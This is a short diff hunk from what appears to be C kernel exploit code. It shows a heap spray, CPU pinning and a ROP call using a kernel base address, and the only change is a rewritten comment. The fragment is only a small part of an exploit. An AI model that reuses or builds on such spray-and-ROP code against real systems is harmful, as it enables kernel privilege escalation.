@@ -318,7 +318,7 @@ int main() {
     for (size_t i = 0; i < spray_stop - spray_start; i++)
         spray_map[i] = spray_start[i];
 
-    // Malloc sprays for heap security
+    // Malloc sprays for CPU cores
     for (int cpu = 1; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
         rop_call_funcptr(spray_map, spray_sock, kernel_base);
